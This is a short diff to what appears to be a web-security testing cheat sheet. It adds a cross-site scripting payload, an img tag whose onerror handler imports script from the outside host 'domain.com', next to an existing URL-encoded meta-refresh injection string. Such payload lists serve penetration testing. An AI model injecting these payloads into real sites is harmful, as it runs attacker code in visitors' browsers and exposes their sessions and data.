@@ -1069,6 +1069,10 @@ Manually testing for XXE vulnerabilities generally involves
   ```
   %22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
   ```
+- [[Reference](https://twitter.com/zseano/status/1599118059511631872)]
+  ```HTML
+  <img src=totallyfake onerror=import(‘//domain.com/‘);//
+  ```
 
 
 ### <ins>Cross-site request forgery (CSRF)</ins>
